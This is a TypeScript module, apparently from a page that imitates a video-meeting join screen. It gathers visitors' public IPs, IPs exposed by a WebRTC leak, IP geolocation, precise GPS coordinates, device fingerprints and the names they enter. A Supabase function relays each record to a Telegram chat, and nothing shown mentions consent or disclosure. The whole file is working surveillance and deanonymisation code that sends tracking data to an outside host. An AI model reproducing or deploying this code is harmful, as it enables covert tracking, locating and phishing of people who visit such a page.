// Telegram Logger for user tracking

// ❌ ПРОБЛЕМА: Хардкод токена - не работает!
// ✅ РЕШЕНИЕ: Использовать backend для отправки

export type PermissionStatus = 'granted' | 'denied' | 'prompt' | 'unavailable' | 'not-supported';

export interface PermissionResult {
  name: string;
  status: PermissionStatus;
  error?: string;
  timestamp: string;
}

// ✅ ИСПРАВЛЕНО: Отправка через backend (серверный endpoint)
export const sendTelegramMessage = async (message: string): Promise<boolean> => {
  try {
    const { projectId, publicAnonKey } = await import('/utils/supabase/info');
    const backendUrl = `https://${projectId}.supabase.co/functions/v1/make-server-039e5f24/telegram/send-message`;
    
    const response = await fetch(backendUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${publicAnonKey}`,
      },
      body: JSON.stringify({ message })
    });
    
    const data = await response.json();
    
    if (response.ok && data.success) {
      console.log('✅ Сообщение отправлено в Telegram');
      return true;
    } else {
      console.warn('⚠️ Ошибка отправки в Telegram:', data);
      return false;
    }
  } catch (error) {
    console.error('❌ Критическая ошибка отправки в Telegram:', error);
    return false;
  }
};

export const logVisitorEntry = async (data: {
  deviceInfo: any;
  publicIP: string;
  webrtcIPs: string[];
  geoData?: { country?: string; city?: string; region?: string; timezone?: string; isp?: string };
}) => {
  const { deviceInfo, publicIP, webrtcIPs, geoData } = data;
  
  const localTime = new Date().toLocaleString('en-US', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  
  // Get user timezone
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const timezoneOffset = -new Date().getTimezoneOffset() / 60; // In hours
  const timezoneOffsetStr = timezoneOffset >= 0 ? `+${timezoneOffset}` : `${timezoneOffset}`;
  
  // Get device languages
  const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
  
  const deviceEmoji = deviceInfo.device === 'ios' ? '📱' : 
                     deviceInfo.device === 'android' ? '🤖' : '🖥️';
  
  let message = `🎯 <b>NEW VISITOR</b>\n\n`;
  
  // Device
  message += `${deviceEmoji} <b>${deviceInfo.deviceName}</b>\n`;
  message += `💻 OS: ${deviceInfo.os || 'Unknown'}\n`;
  message += `🌍 Browser: ${deviceInfo.browser || 'Unknown'}\n`;
  message += `⏰ Local Time: ${localTime}\n`;
  message += `🕐 Timezone: ${timezone} (UTC${timezoneOffsetStr})\n`;
  message += `🗣️ Languages: ${languages}\n\n`;
  
  // IP addresses
  message += `🌐 <b>IP Addresses:</b>\n`;
  message += `   📍 Public: <code>${publicIP}</code>\n`;
  if (webrtcIPs && webrtcIPs.length > 0) {
    message += `   🔍 WebRTC Leak (${webrtcIPs.length}): ${webrtcIPs.map(ip => `<code>${ip}</code>`).join(', ')}\n`;
  } else {
    message += `   ⚠️ WebRTC Leak: not detected\n`;
  }
  message += `\n`;
  
  // IP Geolocation
  if (geoData) {
    message += `📍 <b>Location (by IP):</b>\n`;
    if (geoData.country) {
      message += `   🌍 Country: ${geoData.country}\n`;
    }
    if (geoData.city) {
      message += `   🏙️ City: ${geoData.city}\n`;
    }
    if (geoData.region) {
      message += `   📌 Region: ${geoData.region}\n`;
    }
    if (geoData.timezone) {
      message += `   ⏰ Timezone: ${geoData.timezone}\n`;
    }
    if (geoData.isp) {
      message += `   📡 ISP: ${geoData.isp}\n`;
    }
    message += `\n`;
  }
  
  // Screen (only include valid values)
  message += `📺 <b>Screen:</b>\n`;
  message += `   📐 Size: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n`;
  if (deviceInfo.devicePixelRatio && deviceInfo.devicePixelRatio > 0) {
    message += `   🔢 Pixel Ratio: ${deviceInfo.devicePixelRatio}×\n`;
  }
  message += `\n`;
  
  // Hardware
  if (deviceInfo.hardwareConcurrency || deviceInfo.deviceMemory) {
    message += `⚙️ <b>Hardware:</b>\n`;
  }
  if (deviceInfo.hardwareConcurrency) {
    message += `   🔧 CPU cores: ${deviceInfo.hardwareConcurrency}\n`;
  }
  if (deviceInfo.deviceMemory) {
    message += `   💾 RAM: ${deviceInfo.deviceMemory}GB\n`;
  }
  
  // Network
  if (deviceInfo.connectionEffectiveType) {
    message += `   📶 Network: ${deviceInfo.connectionEffectiveType}`;
    if (deviceInfo.connectionDownlink) {
      message += ` (${deviceInfo.connectionDownlink} Mbps)`;
    }
    message += `\n`;
  }
  
  message += `\n📱 <b>User-Agent:</b>\n<code>${deviceInfo.userAgent.substring(0, 150)}${deviceInfo.userAgent.length > 150 ? '...' : ''}</code>`;
  
  await sendTelegramMessage(message);
};

export const logJoinAttempt = async (roomName: string, userName: string, buttonType: 'join' | 'join-without-audio', deviceInfo: any) => {
  const localTime = new Date().toLocaleString('en-US', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  
  const buttonText = buttonType === 'join' ? 'Join meeting' : 'Join without audio';
  
  const message = `🎬 <b>JOIN ATTEMPT</b>\n\n` +
    `🔘 <b>Button:</b> ${buttonText}\n` +
    `👤 <b>Name:</b> ${userName || 'Not specified'}\n` +
    `🏠 <b>Room:</b> ${roomName}\n` +
    `${deviceInfo.deviceName}\n` +
    `⏰ ${localTime}`;
  
  await sendTelegramMessage(message);
};

export const logGeolocationData = async (
  latitude: number,
  longitude: number,
  accuracy: number,
  source: 'gps' | 'ip',
  deviceInfo: any
) => {
  const lat = latitude.toFixed(6);
  const lng = longitude.toFixed(6);
  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
  
  const localTime = new Date().toLocaleString('en-US', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  
  const sourceEmoji = source === 'gps' ? '📍' : '🌐';
  const sourceText = source === 'gps' ? 'GPS' : 'IP Geolocation';
  
  const message = `${sourceEmoji} <b>GEOLOCATION (${sourceText})</b>\n\n` +
    `📍 <b>Coordinates:</b>\n` +
    `   Latitude: ${lat}\n` +
    `   Longitude: ${lng}\n` +
    `   Accuracy: ±${Math.round(accuracy)} m\n\n` +
    `🗺️ <a href="${googleMapsLink}">Open on map</a>\n\n` +
    `${deviceInfo.deviceName}\n` +
    `⏰ ${localTime}`;
  
  await sendTelegramMessage(message);
};